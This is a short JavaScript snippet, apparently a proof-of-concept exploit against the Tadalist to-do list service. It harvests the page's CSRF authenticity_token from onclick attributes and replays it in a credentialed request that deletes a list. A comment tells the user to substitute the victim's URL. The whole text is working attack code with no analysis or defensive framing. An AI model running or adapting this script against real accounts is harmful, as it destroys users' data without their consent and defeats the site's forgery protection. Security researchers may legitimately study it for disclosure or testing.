(async () => {
  try {
    console.log('[+] Starting token extraction...');
    let token = null;
    for (const el of document.querySelectorAll('[onclick]')) {
      const onclick = el.getAttribute('onclick');
      if (!onclick) continue;
      const match = onclick.match(/setAttribute\(['"]name['"],\s*['"]authenticity_token['"]\);\s*.*setAttribute\(['"]value['"],\s*['"]([^'"]+)['"]\)/i);
      if (match) {
        token = match[1];
        break;
      }
    }
    if (!token) {
      console.error('[-] authenticity_token not found!');
      return;
    }
    console.log('[+] Found authenticity_token:', token);

    const targetUrl = 'https://123456.tadalist.com/lists/2356146';  // change to victim's full URL
    console.log('[+] Sending DELETE request to:', targetUrl);

    const formData = new URLSearchParams();
    formData.append('_method', 'delete');
    formData.append('authenticity_token', token);

    const response = await fetch(targetUrl, {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: formData.toString(),
      redirect: 'follow'
    });

    if (response.ok) {
      console.log('[+] List deleted successfully!');
    } else {
      console.warn(`[-] Failed to delete list. Status: ${response.status}`);
      const text = await response.text();
      console.log('[>] Response snippet:', text.slice(0, 500));
    }
  } catch (err) {
    console.error('[-] Error occurred:', err);
  }
})();
